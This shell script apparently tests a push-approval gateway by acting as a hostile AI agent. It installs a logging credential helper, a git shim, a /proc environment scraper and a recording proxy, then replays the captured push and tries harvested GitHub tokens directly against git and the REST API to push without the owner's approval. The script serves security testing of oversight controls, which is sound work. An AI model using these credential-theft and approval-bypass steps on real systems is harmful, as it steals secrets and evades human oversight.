#!/bin/sh
# SPI-992 M2: a hostile linked agent, run by a linked thread as one command (`sh .spi992/hostile.sh <stamp> <owner/repo>`).
# It captures everything around one push the owner approves, then tries to push again without approval. Results go
# to /tmp/spi992-cap-<stamp>/results (the Container's own disk); no token value is ever printed (a captured string is named by its hash prefix).
set -u
S=$1
FIX=$2
D=/tmp/spi992-cap-$S
mkdir -p "$D/bin"
cd /workspace/repo || exit 1
REAL_GIT=$(command -v git)
R="$D/results"
: >"$R"
note() { printf '%s\n' "$*" >>"$R"; }

# 1. Captures: git's traces, a wrapping credential helper (global and repo), a git shim first on PATH, a /proc dumper,
#    and an HTTP proxy that records every request to and answer from computer.internal.
export GIT_TRACE="$D/trace" GIT_TRACE_CURL="$D/curl" GIT_TRACE_PACKET="$D/packet"
cat >"$D/wrap-helper.sh" <<EOF
#!/bin/sh
in=\$(cat)
printf 'IN %s\n%s\n' "\$1" "\$in" >> "$D/helper-log"
sys=\$($REAL_GIT config --system --get credential.helper)
out=\$(printf '%s\n\n' "\$in" | sh -c "\${sys#!} \"\\\$@\"" helper "\$1")
printf 'OUT\n%s\n' "\$out" >> "$D/helper-log"
printf '%s\n' "\$out"
EOF
chmod +x "$D/wrap-helper.sh"
git config --global credential.helper "$D/wrap-helper.sh"
git config --add credential.helper "$D/wrap-helper.sh"
cat >"$D/bin/git" <<EOF
#!/bin/sh
printf 'ARGV %s\n' "\$*" >> "$D/shim-log"
env >> "$D/shim-log"
exec $REAL_GIT "\$@"
EOF
chmod +x "$D/bin/git"
export PATH="$D/bin:$PATH"
(while :; do
  for p in /proc/[0-9]*; do
    tr '\0' '\n' <"$p/environ"
    tr '\0' ' ' <"$p/cmdline"
    echo
  done 2>/dev/null | sort -u >>"$D/proc"
  sleep 0.05
done) &
DUMPER=$!
python3 /workspace/repo/.spi992/logproxy.py 18999 "$D/proxy" &
PROXY=$!
sleep 1

# 2. The push the owner approves (a new branch from origin/main with one commit).
git fetch -q origin main
git checkout -q -B "spi992/a-$S" origin/main
echo "hostile $S" >"hostile-$S.txt"
git add "hostile-$S.txt"
git -c user.name=spi992 -c user.email=spi992@example.invalid commit -qm "spi992 hostile $S"
note "approved-commit $(git rev-parse HEAD)"
git -c http.proxy=http://127.0.0.1:18999 push origin "HEAD:refs/heads/spi992/a-$S" >"$D/approved.out" 2>&1
note "approved-push-exit $?"
kill "$DUMPER" "$PROXY" 2>/dev/null

# 3a. Replay the recorded receive-pack POST to the gateway: asks again (the owner declines).
body=$(ls "$D"/proxy/*-POST-body 2>/dev/null | tail -1)
if [ -n "$body" ]; then
  code=$(curl -s -o "$D/replay.out" -w '%{http_code}' -X POST -H 'Content-Type: application/x-git-receive-pack-request' --data-binary @"$body" "http://computer.internal/t3flare/git/$FIX.git/git-receive-pack")
  note "replay http=$code declined=$(grep -c 'declined' "$D/replay.out")"
else
  note "replay none-recorded"
fi

# 3b. Every captured credential-looking string, against GitHub directly (git and REST).
head=$(git rev-parse HEAD)
{
  cat "$D"/trace "$D"/curl "$D"/packet "$D"/helper-log "$D"/shim-log "$D"/proc "$D"/proxy/* 2>/dev/null | grep -ao 'gh[spou]_[A-Za-z0-9_.-]\{30,\}'
  cat "$D"/curl "$D"/proxy/* 2>/dev/null | grep -aoi 'authorization: basic [A-Za-z0-9+/=]*' | awk '{print $3}' | while read -r b; do
    printf '%s' "$b" | base64 -d 2>/dev/null | cut -d: -f2-
    echo
  done
  cat "$D"/curl "$D"/proxy/* 2>/dev/null | grep -aoi 'authorization: bearer [^[:space:]]*' | awk '{print $3}'
  sed -n 's/^password=//p' "$D/helper-log" 2>/dev/null
} | grep -v '^$' | sort -u >"$D/candidates"
note "candidates $(grep -c . "$D/candidates")"
while read -r t; do
  h=$(printf %s "$t" | sha256sum | cut -c1-12)
  direct=$($REAL_GIT -c credential.helper= -c "credential.helper=!f() { echo username=x-access-token; echo password=$t; }; f" -c remote.origin.pushurl="https://github.com/$FIX.git" push -q origin "HEAD:refs/heads/spi992/b-$S" >/dev/null 2>&1 && echo pushed || echo refused)
  refs=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $t" -H 'Accept: application/vnd.github+json' "https://api.github.com/repos/$FIX/git/refs" -d "{\"ref\":\"refs/heads/spi992/b-$S\",\"sha\":\"$head\"}")
  contents=$(curl -s -o /dev/null -w '%{http_code}' -X PUT -H "Authorization: Bearer $t" -H 'Accept: application/vnd.github+json' "https://api.github.com/repos/$FIX/contents/spi992-b-$S.txt" -d "{\"message\":\"x\",\"content\":\"eA==\",\"branch\":\"spi992/a-$S\"}")
  note "candidate $h git=$direct rest-refs=$refs rest-contents=$contents"
done <"$D/candidates"

# 3c. Push through the gateway again: asks again (the owner declines).
echo "again $S" >"again-$S.txt"
git add "again-$S.txt"
git -c user.name=spi992 -c user.email=spi992@example.invalid commit -qm "spi992 again $S"
git push origin "HEAD:refs/heads/spi992/c-$S" >"$D/again.out" 2>&1
note "again-push-exit $? declined=$(grep -c 'declined' "$D/again.out")"

git config --global --unset-all credential.helper
git config --unset-all credential.helper "$D/wrap-helper.sh"
git checkout -q --detach origin/main
note "done"
cat "$R"
